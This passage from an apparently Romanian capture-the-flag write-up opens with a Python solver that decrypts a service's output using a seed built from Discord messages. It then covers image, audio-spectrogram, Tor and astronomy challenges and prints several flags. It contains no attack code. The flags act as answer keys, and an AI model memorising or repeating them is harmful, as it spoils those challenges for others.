            break
        buf += chunk
        if b"\n" in buf:
            break
    return buf.decode(errors="replace").strip()

def extract_encrypted(line: str):
    # încearcă JSON -> string cu apostroafe -> parsing rudimentar
    try:
        j = json.loads(line)
        if isinstance(j, dict) and "encrypted" in j:
            return j["encrypted"]
    except Exception:
        pass
    try:
        j = json.loads(line.replace("'", '"'))
        if isinstance(j, dict) and "encrypted" in j:
            return j["encrypted"]
    except Exception:
        pass
    if "encrypted" in line:
        sub = line[line.find("encrypted"):]
        for q in ('"', "'"):
            a = sub.find(q)
            if a != -1:
                b = sub.find(q, a+1)
                if b != -1:
                    return sub[a+1:b]
    return None

def main():
    parser = argparse.ArgumentParser(description="Fetch messages from Discord (bot token), build seed and decrypt CTF service output.")
    parser.add_argument("host", help="CTF host/IP")
    parser.add_argument("port", nargs="?", type=int, default=5000, help="CTF port (default 5000)")
    parser.add_argument("--token", help="Bot token (optional). Better set DISCORD_BOT_TOKEN env var).")
    parser.add_argument("--limit", type=int, default=10, help="How many messages to fetch per channel (default 10)")
    parser.add_argument("--show-seed", action="store_true", help="Print seed (for local debug only!). Do NOT share seed.")
    args = parser.parse_args()

    token = args.token or os.getenv("DISCORD_BOT_TOKEN")
    if not token:
        print("ERROR: furnizează token bot (env DISCORD_BOT_TOKEN sau --token).")
        sys.exit(1)

    try:
        seed_bytes, parts = build_seed_from_channels(token, CHANNELS, limit=args.limit)
    except Exception as e:
        print("[!] Eroare la fetch mesaje de pe Discord:", e)
        sys.exit(1)

    print(f"[*] Seed construit ({len(seed_bytes)} bytes).")
    if args.show_seed:
        # Atenție: nu publica seedul! Folosește doar local pentru debugging.
        print("DEBUG seed repr (don't share):")
        try:
            print(repr(seed_bytes.decode("utf-8", errors="replace")))
        except Exception:
            print(repr(seed_bytes))

    # Optionally print each part for debugging
    # for i, p in enumerate(parts):
    #     print(f"[{i}] repr: {repr(p)}")

    # Connect to CTF host
    try:
        with socket.create_connection((args.host, args.port), timeout=8) as s:
            line = recv_line(s, timeout=6.0)
    except Exception as e:
        print("[!] Nu am putut conecta la CTF server:", e)
        sys.exit(1)

    if not line:
        print("[!] Nu am primit răspuns de la server.")
        sys.exit(1)

    encrypted_b64 = extract_encrypted(line)
    if not encrypted_b64:
        print("[!] Nu am putut extrage 'encrypted' din:", line)
        sys.exit(1)

    print("[*] Am primit encrypted (base64). Decriptez...")
    try:
        plaintext = decrypt_blob_b64(encrypted_b64, seed_bytes)
    except Exception as e:
        print("[!] Eroare la decriptare:", e)
        print("    Verifică:")
        print("    - bot-ul are permisiunile View Channels + Read Message History")
        print("    - mesajele returnate conțin exact timestamp-urile așa cum le folosește serverul")
        sys.exit(1)

    print("\n== Decrypted (bytes) ==")
    print(plaintext)
    print("\n== Decrypted (utf-8 if possible) ==")
    try:
        print(plaintext.decode("utf-8"))
    except Exception:
        print("<not valid utf-8>")

if __name__ == "__main__":
    main()

```

### ancient_house
- This challange may seem difficult at first sight, but it actually uncovers a simple solve.
- Downloading the picture given and asking chatgpt to repair it according to the text, we get a clean picture, which google lens instantly recognises and gives us the flag at first sight.
- ![image](https://github.com/user-attachments/assets/27e95e63-0610-4656-81b5-7f120ea5bf2b)
- ![image](https://github.com/user-attachments/assets/65a13869-f053-4e2c-a812-06afa1c10fc1)

- CTF{Dumbrava}

### 3rd_child
- By playing the audio file, I instantly recognise the familiar song name, but also an audio pattern which surely states CTF.
- The rest of the flag/ sha256, is being overlapped by the song.
- Using audacity, I could see 3 tracks. I enabled the "show spectogram" option, and finally, the last track displayed the flag.
- ![image (1)](https://github.com/user-attachments/assets/1fb861b0-f110-4463-a7c7-a6ee597071ec)

### onions1
- The easiest challange. Easier than "feedback".
- The long "hashy" link and the ".onion" extension made me open tor browser in a split second.
- Opening the website, the flag was shown.
- ![image](https://github.com/user-attachments/assets/c397a16b-4335-4cbd-b020-145b4bf73ef8)
- ctf{fc5b4974d9c262a40810686f06dc5525b046a810ad3f8cd20d62f4d2f6379dbd}

### Escaping-Barcelona
- My qwant and google search queries were really bad, not finding any posibile solution to this challange.
- Grok, though, was ready to help me.
- Using a new library, that I have never heard of, the distance was easily calculated.
- ctf{361.287 M km}
```
from astropy.utils.iers import conf
conf.auto_max_age = None
import astropy.units as u
from astropy.time import Time
from astropy.coordinates import get_body_barycentric, EarthLocation
t = Time('2025-11-07T16:00:00')
location = EarthLocation(lat=41.3851*u.deg, lon=2.1734*u.deg, height=0*u.m)
observer_gcrs = location.get_gcrs(t)
earth_bary = get_body_barycentric('earth', t)
observer_bary = earth_bary + observer_gcrs.cartesian
mars_bary = get_body_barycentric('mars', t)
delta = mars_bary - observer_bary
distance = delta.norm()
dist_km = distance.to(u.km).value
dist_mkm = dist_km / 1e6
print(f"ctf{{{dist_mkm:.3f} M km}}")
```
